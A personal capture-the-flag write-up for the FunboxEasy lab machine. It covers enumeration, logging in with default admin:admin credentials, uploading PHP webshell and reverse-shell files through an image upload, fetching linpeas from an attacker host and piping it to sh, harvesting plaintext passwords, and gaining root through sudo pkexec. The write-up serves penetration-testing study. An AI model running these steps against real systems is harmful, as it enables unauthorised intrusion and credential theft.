# FunboxEasy Notes

### Enumeration
- whatweb
	- Apache 
	- Ubuntu OS

- Nmap 
	- quick scan 
		- 80 -> HTTP (Apache httpd 2.4.41)
		- 22 -> SSH (OpenSSH 8.2p1)
	- full-scan (additional found)
		- 33060 -> MySQL??

- uniscan
	- /admin
		- index
		- home
	- /secret
	- potential SQLi's:
		- /store/book.php

- Manual inspection
	- looks like it was made by project world
		- googling project world shows the credentials are admin:admin t the store admin page

### Foothold
- got access to the /store/admin with admin:admin
- the add book functionality allows the upload of a image
	- allowed to upload a webshell -> /usr/share/webshells/php/simple-backdoor.php
- use burp to figure out where the img is being up 
	- browse to location with ?cmd=ls 
	- which nc shows the machine has nc 

- ../../database/readme.txt.txt
	- from ../../../dbconnection.php -> localhost, crm, crm, crm
	- email: nghi.lethanh2@cou.fi

- use the same process to upload a revshell
	- /usr/share/webshells/php/php-rev-shell.php

### Priv Esc 
- on the machine: 
	- upgrade shell
		-  ```$ which python3 
			/usr/bin/python3
			$ python3 -c "import pty; pty.spawn('/bin/bash');"```
 - run linpeas: 
	 - start python server in dir with linpeas: 
		- ```python -m http.server 80```
	- get linpeas from host machine and pipe to sh: 
		- ```wget http://192.168.49.196/linpeas.sh | sh ```
		- shows interesting user 'tony' on system 
- go to /home/tony 
	- can see the file password.txt
		- all creds in file: 
			- ssh: yxcvbnmYYY
			- gym/admin: asdfghjklXXX
			- /store: admin@admin.com admin

- ssh -> tony@{ip}
	- sudo -l 
		- check gtfobins
			- sudo pkexec /bin/sh 

- proof.txt file: 
	- ![[Pasted image 20220412162128.png]]

